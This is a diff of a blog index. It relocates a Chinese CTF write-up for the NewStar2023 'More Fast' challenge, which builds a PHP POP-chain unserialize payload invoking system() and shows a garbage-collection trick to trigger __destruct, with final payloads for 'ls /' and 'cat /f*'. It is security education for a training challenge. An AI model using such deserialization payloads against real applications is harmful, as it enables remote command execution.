@@ -74,6 +74,54 @@
       </tags>
   </entry>
   <entry>
+    <title>BUUCTF-NewStar2023-Week4-More Fast</title>
+    <url>/2023/10/27/BUUCTF-NewStar2023-Week4-More-Fast/</url>
+    <content><![CDATA[<img data-src="https://s3.bmp.ovh/imgs/2023/10/28/34dbf8d94778b773.png" style="zoom:67%;" />
+
+<p>打开环境</p>
+<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/a48a8a88d726c925.png"></p>
+<p>我们可以看出是POP链构造<span id="more"></span>（不知道什么是POP链的可以自己上网找）</p>
+<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/913636a6247b1fa3.png"></p>
+<p>构造出来是这样的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func= <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="keyword">var</span>= <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$fast</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fast</span>;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在本地运行得到序列化字符串</p>
+<p><strong>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}</strong></p>
+<p>将其用post传参后，回显没有变化。</p>
+<p>提示中提到关键在__destruct()魔术方法</p>
+<hr>
+<p>在php中，当对象被销毁时会自动调用__destruct()方法，<strong>但如果程序报错或者抛出异常，就不会触发该魔术方法。</strong></p>
+<p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p>
+<p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
+<p>触发垃圾回收机制的方法有：（本质即使对象引用计数归零）</p>
+<p>（1）对象被unset()处理时，可以触发。</p>
+<p>（2）数组对象为NULL时，可以触发。</p>
+<p>参考链接：<a href="https://blog.csdn.net/Myon5/article/details/134018456">https://blog.csdn.net/Myon5/article/details/134018456</a></p>
+<hr>
+<p>这里采用第二种方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func= <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="keyword">var</span>= <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$fast</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fast</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到序列化字符串</p>
+<p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}i:1;i:0;}</p>
+<p>将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong>即可绕过GC回收，唤醒__destruct()魔术方法。</p>
+<p>成功执行’ls &#x2F;‘，看到flag在根目录</p>
+<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/d2ebdd1475db7d16.png"></p>
+<p>将构造中的’ls &#x2F;‘改为’cat &#x2F;flag’，在进行序列化操作，得到</p>
+<p>fast&#x3D;a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;}</p>
+<p>别忘了将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong></p>
+<p>提交后得到flag</p>
+<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/101171cd3a8346bc.png"></p>
+]]></content>
+      <categories>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>POP链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
     <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
     <content><![CDATA[<img data-src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
@@ -191,54 +239,6 @@
       <tags>
         <tag>Http</tag>
         <tag>状态码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week4-More Fast</title>
-    <url>/2023/10/27/BUUCTF-NewStar2023-Week4-More-Fast/</url>
-    <content><![CDATA[<img data-src="https://s3.bmp.ovh/imgs/2023/10/28/34dbf8d94778b773.png" style="zoom:67%;" />
-
-<p>打开环境</p>
-<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/a48a8a88d726c925.png"></p>
-<p>我们可以看出是POP链构造<span id="more"></span>（不知道什么是POP链的可以自己上网找）</p>
-<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/913636a6247b1fa3.png"></p>
-<p>构造出来是这样的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func= <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="keyword">var</span>= <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$fast</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fast</span>;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在本地运行得到序列化字符串</p>
-<p><strong>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}</strong></p>
-<p>将其用post传参后，回显没有变化。</p>
-<p>提示中提到关键在__destruct()魔术方法</p>
-<hr>
-<p>在php中，当对象被销毁时会自动调用__destruct()方法，<strong>但如果程序报错或者抛出异常，就不会触发该魔术方法。</strong></p>
-<p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p>
-<p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
-<p>触发垃圾回收机制的方法有：（本质即使对象引用计数归零）</p>
-<p>（1）对象被unset()处理时，可以触发。</p>
-<p>（2）数组对象为NULL时，可以触发。</p>
-<p>参考链接：<a href="https://blog.csdn.net/Myon5/article/details/134018456">https://blog.csdn.net/Myon5/article/details/134018456</a></p>
-<hr>
-<p>这里采用第二种方法</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span>-&gt;func= <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;<span class="keyword">var</span>= <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;obj=<span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;func=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;obj=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;errMsg=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$fast</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$fast</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到序列化字符串</p>
-<p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}i:1;i:0;}</p>
-<p>将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong>即可绕过GC回收，唤醒__destruct()魔术方法。</p>
-<p>成功执行’ls &#x2F;‘，看到flag在根目录</p>
-<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/d2ebdd1475db7d16.png"></p>
-<p>将构造中的’ls &#x2F;‘改为’cat &#x2F;flag’，在进行序列化操作，得到</p>
-<p>fast&#x3D;a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;}</p>
-<p>别忘了将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong></p>
-<p>提交后得到flag</p>
-<p><img data-src="https://s3.bmp.ovh/imgs/2023/10/28/101171cd3a8346bc.png"></p>
-]]></content>
-      <categories>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>POP链</tag>
       </tags>
   </entry>
   <entry>
@@ -364,343 +364,6 @@
         <tag>CTF</tag>
         <tag>PHP</tag>
         <tag>伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLmap使用</title>
-    <url>/2023/10/29/SQLmap%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h2><p>(1) 猜解是否能注入</p>
